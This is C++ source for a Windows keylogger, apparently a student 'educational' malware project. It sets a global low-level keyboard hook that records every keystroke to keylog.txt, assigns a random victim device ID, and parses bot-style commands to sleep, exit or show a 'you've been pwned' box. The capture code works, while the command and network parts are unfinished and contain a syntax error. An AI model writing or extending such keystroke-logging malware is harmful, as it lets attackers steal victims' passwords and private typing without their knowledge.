#include <iostream>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>

#include <wininet.h>
#pragma comment(lib, "wininet.lib")

using namespace std;

string DeviceID;

// Coverts key int to string
string KeyToString(int key) {
    switch (key) {
        case VK_RETURN:
            return "[ENTER]";
        case VK_SPACE:
            return "[SPACE]";
        case VK_TAB:
            return "[TAB]";
        case VK_BACK:
            return "[BACKSPACE]";
        case VK_SHIFT:
            return "[SHIFT]";
        case VK_LSHIFT:
            return "[L_SHIFT]";
        case VK_RSHIFT:
            return "[R_SHIFT]";
        case VK_CONTROL:
            return "[CTRL]";
        case VK_LCONTROL:
            return "[L_CTRL]";
        case VK_RCONTROL:
            return "[R_CTRL]";
        case VK_MENU:
            return "[ALT]";
        case VK_LMENU:
            return "[L_ALT]";
        case VK_RMENU:
            return "[R_ALT]";
        case VK_CAPITAL:
            return "[CAPS LOCK]";
        case VK_ESCAPE:
            return "[ESC]";
        case VK_PRIOR:
            return "[PAGE UP]";
        case VK_NEXT:
            return "[PAGE DOWN]";
        case VK_END:
            return "[END]";
        case VK_HOME:
            return "[HOME]";
        case VK_LEFT:
            return "[LEFT_ARROW]";
        case VK_UP:
            return "[UP_ARROW]";
        case VK_RIGHT:
            return "[RIGHT_ARROW]";
        case VK_DOWN:
            return "[DOWN_ARROW]";
        case VK_INSERT:
            return "[INSERT]";
        case VK_DELETE:
            return "[DELETE]";
        case VK_PRINT:
            return "[PRINT_SCREEN]";
        case VK_PAUSE:
            return "[PAUSE]";
        case VK_PLAY:
            return "[PLAY]";
        case VK_F1:
            return "[F1]";
        case VK_F2:
            return "[F2]";
        case VK_F3:
            return "[F3]";
        case VK_F4:
            return "[F4]";
        case VK_F5:
            return "[F5]";
        case VK_F6:
            return "[F6]";
        case VK_F7:
            return "[F7]";
        case VK_F8:
            return "[F8]";
        case VK_F9:
            return "[F9]";
        case VK_F10:
            return "[F10]";
        case VK_F11:
            return "[F11]";
        case VK_F12:
            return "[F12]";
        default:
            return  string(1, static_cast<char>(key));
    }
}

//log keystrokes to file
void LogKeystroke(int key) {
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios_base::app);

    if (logfile.is_open()) {
        std::string keyStroke = KeyToString(key);
        if (!keyStroke.empty()) {
            logfile << keyStroke;
        } else {
            logfile << "[UNKOWN_KEY]";
        }
        logfile.close();
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            LogKeystroke(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Display a message to the Victum
void DisplayMessage() {
    MessageBox(NULL, L"Sorry, you've been pwned, for educational purposes!", L"Pwned!", MB_OK | MB_ICONEXCLAMATION);
}

void FalseCommandResponce(string message){

}


//Follow commands recieved
void FollowCommand(const std::string &command){
    std::vector<std::string> commandSegmants;
    std::string segment;
    std::stringstream segmentStream(command);
    while (std::getline(segmentStream, segment, ' ')) {
        commandSegmants.push_back(segment);
    }
    
    if (commandSegmants.size()>3 || commandSegmants.size()<2) {
        //False Command
        return;
    }
    
    std::string cmd = commandSegmants[0];
    std::string id = commandSegmants[1];

    if (id != DeviceID){
        return;
    }
    else {
        if(cmd == "slp"){
            int n = 5; //default sleep time
            if(commandSegmants.size() == 3){
                size_t pos;
                int n = std::stoi(commandSegmants[2], &pos);
                if (pos != commandSegmants[2].size()){
                    //n was Incorrectly inputted
                    FalseCommandResponce("Invalid sleep length.")
                }
            }
            Sleep(n);
        } else if (cmd == "shd"){
            exit(0);
        } else if (cmd == "pwn"){
            DisplayMessage();
        } else {
            string message = cmd + " is not a valid commad";
            FalseCommandResponce(message);
        }
    }
}


// Main function
int main() {
    //Set the hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Failed to set hook\n";
    }

    srand(static_cast<unsigned int>(time(nullptr)));
    int id = rand();
    DeviceID = "Device-" + to_string(id);

    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
